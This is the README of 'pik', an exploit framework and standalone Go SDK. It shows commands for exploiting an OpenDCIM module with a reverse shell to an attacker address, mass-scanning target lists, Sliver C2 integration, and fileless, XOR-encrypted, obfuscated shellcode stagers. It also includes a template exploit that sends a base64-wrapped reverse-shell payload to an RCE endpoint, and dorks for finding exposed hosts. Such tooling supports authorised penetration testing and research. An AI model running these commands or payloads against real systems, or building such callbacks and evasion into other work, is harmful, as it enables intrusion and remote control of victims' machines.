# pik

Go exploit framework with a standalone SDK. Write exploits once, run them as standalone binaries or inside the framework with a console, scanner, C2 integration, and multi-arch stagers.

## Install

```bash
go install github.com/Chocapikk/pik/cmd/pik@latest
```

## Quick start

```bash
# Check a target
pik check exploit/http/linux/opendcim -t http://target

# Exploit with reverse shell
pik run exploit/http/linux/opendcim -t http://target -s LHOST=10.0.0.1

# Interactive console
pik console

# Module info with search engine dorks
pik info exploit/http/linux/opendcim
```

## SDK - Write your own exploits

The SDK is a standalone Go module with zero external dependencies. Install it:

```bash
go get github.com/Chocapikk/pik/sdk
```

Or scaffold a new exploit:

```bash
pik new myexploit
cd myexploit
go mod init myexploit
go get github.com/Chocapikk/pik/sdk
go build .
./myexploit -t http://target -check
```

### Minimal exploit

```go
package main

import "github.com/Chocapikk/pik/sdk"

type MyExploit struct{ sdk.Pik }

func (m *MyExploit) Info() sdk.Info {
    return sdk.Info{
        Description: "Example exploit",
        Authors:     []string{"you"},
        Reliability: sdk.Typical,
        Targets:     []sdk.Target{sdk.TargetLinux("amd64")},
    }
}

func (m *MyExploit) Check(run *sdk.Context) (sdk.CheckResult, error) {
    resp, err := run.Send(sdk.Request{Path: "/vulnerable"})
    if err != nil {
        return sdk.CheckResult{Code: sdk.CheckUnknown}, err
    }
    if resp.ContainsAny("vulnerable_marker") {
        return sdk.CheckResult{Code: sdk.CheckVulnerable, Reason: "marker found"}, nil
    }
    return sdk.CheckResult{Code: sdk.CheckSafe}, nil
}

func (m *MyExploit) Exploit(run *sdk.Context) error {
    cmd := run.CommentTrail(run.Base64Bash(run.Payload()))
    _, err := run.Send(sdk.Request{
        Method: "POST",
        Path:   "/rce",
        Form:   sdk.Values{"cmd": {cmd}},
    })
    return err
}

func main() {
    sdk.Run(&MyExploit{})
}
```

Build and run:

```bash
go build -o myexploit .
./myexploit -t http://target -lhost 10.0.0.1
```

The standalone binary includes check, exploit, reverse shell listener, and colored output. ~6 MB, zero framework dependency.

### SDK reference

**Context helpers** - available in `Check()` and `Exploit()` via `run`:

| Method | Description |
|--------|-------------|
| `run.Send(sdk.Request{...})` | Send HTTP request |
| `run.Payload()` | Get the reverse shell command |
| `run.Base64Bash(cmd)` | Base64 encode + bash wrapper |
| `run.CommentTrail(cmd)` | Append ` #` to neutralize trailing args |
| `run.RandText(n)` | Random alphabetic string |
| `run.Elapsed(true/false)` | Timer for time-based detection |
| `run.Status/Success/Warning/Error(fmt, ...)` | Colored output |

**Info metadata**:

| Field | Description |
|-------|-------------|
| `Description` | One-liner for module lists |
| `Detail` | Longer description (use `sdk.Dedent`) |
| `Authors` | List of author names |
| `Reliability` | `sdk.Unstable` through `sdk.Certain` |
| `References` | `sdk.CVE("2026-XXXXX")`, `sdk.URL("...")`, `sdk.EDB("...")` |
| `Queries` | Search engine dorks with auto-generated URLs |
| `Targets` | `sdk.TargetLinux("amd64", "arm64")` |

**Search engine dorks** - auto-generate clickable URLs:

```go
Queries: []sdk.Query{
    sdk.Shodan(`http.title:"myapp"`),
    sdk.FOFA(`title="myapp"`),
    sdk.ZoomEye(`title="myapp"`),
    sdk.Censys(`services.http.response.html_title:"myapp"`),
    sdk.LeakIX(`"myapp"`, "service"),
    sdk.Google(`intitle:"myapp"`),
},
```

## Framework features

### Build standalone binaries

Extract a single exploit from the framework into a self-contained binary:

```bash
pik build exploit/http/linux/opendcim -o opendcim
./opendcim -t http://target -check
```

### Console

Interactive REPL with tab completion, fuzzy module search, and colored output:

```
pik > use opendcim
pik exploit/http/linux/opendcim > set TARGET http://target
pik exploit/http/linux/opendcim > set LHOST 10.0.0.1
pik exploit/http/linux/opendcim > check
pik exploit/http/linux/opendcim > exploit
```

### Mass scanning

```bash
pik check exploit/http/linux/opendcim -f targets.txt -t 50 -o vulnerable.txt
```

### C2 integration

Supports Sliver C2 for implant generation, staging, and session management:

```bash
pik run exploit/http/linux/opendcim -t http://target \
    -s LHOST=10.0.0.1 -s C2=sliver -s C2CONFIG=~/.sliver/configs/operator.cfg
```

### CmdStager delivery

Chunk binary payloads through limited injection vectors:

```bash
pik run exploit/http/linux/opendcim -t http://target \
    -s LHOST=10.0.0.1 -s DELIVERY=cmdstager -s CMDSTAGER=printf
```

Supports `printf`, `bourne` flavors, and TCP stagers with multi-arch support (amd64, arm64, 386).

### TCP stagers

Pure Go, hand-assembled shellcode stagers for Linux. Fileless execution via `memfd_create` + `execveat`, XOR-encrypted payload stream, fake ELF section headers, obfuscated syscall numbers.

| Arch | Size |
|------|------|
| amd64 | ~740 B |
| arm64 | ~750 B |
| 386 | ~600 B |

## Architecture

```
pik/
  sdk/                  # Standalone SDK (own go.mod, zero deps)
    exploit.go          # Exploit/Checker/CmdStager interfaces
    info.go             # Info, Reliability, CheckCode, Target
    reference.go        # CVE/GHSA/EDB references
    query.go            # Search engine dorks + URL generation
    run.go              # Context (HTTP, logging, payload helpers)
    log.go              # Colored output (ANSI, zero deps)
    standalone.go       # sdk.Run() standalone CLI + listener
  modules/              # Exploit modules (import only sdk)
  pkg/                  # Framework internals
    cli/                # CLI commands (check, run, build, new, info)
    console/            # Interactive REPL
    runner/             # Execution engine
    c2/                 # C2 backends (shell, sliver)
    stager/             # TCP stager generation
    http/               # HTTP client
    payload/            # Payload encoding/wrapping
    output/             # Framework output (delegates to sdk)
  cmd/pik/              # Main binary
```

## License

AGPL-3.0
